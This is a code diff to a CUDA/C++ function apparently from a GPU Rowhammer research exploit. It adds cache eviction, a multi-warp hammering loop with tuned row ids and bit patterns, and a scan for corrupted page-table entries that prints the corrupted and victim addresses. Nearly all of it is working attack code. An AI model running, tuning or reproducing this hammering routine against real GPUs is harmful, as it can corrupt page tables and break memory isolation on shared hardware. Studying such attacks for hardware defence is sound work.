@@ -19,10 +19,12 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
 {
   int timein;
   char **first_ptc_ptrs;
+  char **agg_ptrs;
+  char *evict_ptr;
   RowList agg_row_list;
   std::vector<uint64_t> agg_vec;
   if (!first_PT_chunk_fill (num_alloc_init, num_alloc, alloc_id, threshold,
-                            skip, &first_ptc_ptrs, &agg_row_list, &agg_vec))
+                            skip, &first_ptc_ptrs, &agg_ptrs, &evict_ptr,  &agg_row_list, &agg_vec))
     {
         printf("Error: First PTC Allocation is wrong\n");
         exit(1);
@@ -30,7 +32,7 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
 
     std::cout << "Waiting for Identifing Info Intialization... " << '\n';
 
-    for (uint64_t i = 0; i < num_alloc_init - 113; i += 1)
+    for (uint64_t i = 0; i < num_alloc_init - 50  - (35) - 4; i += 1)
     {
         memset_ptr<<<1, 1>>>(first_ptc_ptrs[i] + 64 * 1024, 2 * 1024 * 1024 - 64 * 1024);
     }
@@ -41,13 +43,39 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
     // std::cout << std::hex << (void*)agg_ptr << '\n';
     std::cout << std::dec;
 
-    // print_memory<<<1, 1>>>(agg_ptr + 64 * 1024, 100);
-    // cudaDeviceSynchronize();
+    print_memory<<<1, 1>>>(first_ptc_ptrs[0] + 64 * 1024, 100);
+    cudaDeviceSynchronize();
 
     std::cout << "Identifing Data Placed, Wait for Hammer" << '\n';
     std::cin.clear();
     std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
     std::cin >> timein;
+
+    const uint64_t num_victim = 23;
+    const uint64_t step       = 256;
+    const uint64_t it         = 46000;
+    const uint64_t min_rowId  = 30329 - 94;
+    const uint64_t max_rowId  = 30329 + 5;
+    const uint64_t row_step   = 4;
+    const uint64_t skip_step  = 4;
+    const uint64_t size       = 46L * 1024 * 1024 * 1024;
+    const uint64_t n          = 8;
+    const uint64_t k          = 3;
+    const uint64_t delay      = 55;
+    const uint64_t period     = 1;
+    const uint64_t count_iter = 10;
+    const uint64_t num_rows   = 64100;
+    const uint64_t vic_pat    = std::stoull("0x55", nullptr, 16);
+    const uint64_t agg_pat    = std::stoull("0xAA", nullptr, 16);
+
+    for (int j = 0; j < 100; j++)
+    {
+        evict_L2cache ((uint8_t *)evict_ptr);
+        cudaDeviceSynchronize ();
+        /* Start the hammering and measure the time */
+        uint64_t time = start_multi_warp_hammer (
+            agg_row_list, agg_vec, it, n, k, agg_vec.size(), delay, period);
+    }
 
     bool found_mismatch = false;
     char *temp_addr, *corrupted_addr, *victim_addr;
@@ -60,7 +88,7 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
      * If not repetition, find if it matches a PTE.
      * TODO: maybe later extend more
      */
-    for (uint64_t i = 0; !found_mismatch && i < num_alloc_init - 113 ; i += 1)
+    for (uint64_t i = 0; !found_mismatch && i < num_alloc_init - 50  - (35) - 4; i += 1)
     {
         for (uint64_t j = 64 * 1024; j < 2 * 1024 * 1024; j += 64 * 1024)
         {
@@ -90,7 +118,7 @@ first_PT_chunk_attack (uint64_t num_alloc_init, uint64_t num_alloc,
 
     if (found_mismatch)
     {
-        std::cout << "Corrupted: " << (void*) corrupted_addr << ". Victim: "<< (void*)victim_addr << '\n';
+        std::cout << "Corrupted: " << corrupt_id << ' ' << (void*) corrupted_addr << ". Victim: "<< (void*)victim_addr << '\n';
     }
     else
     {
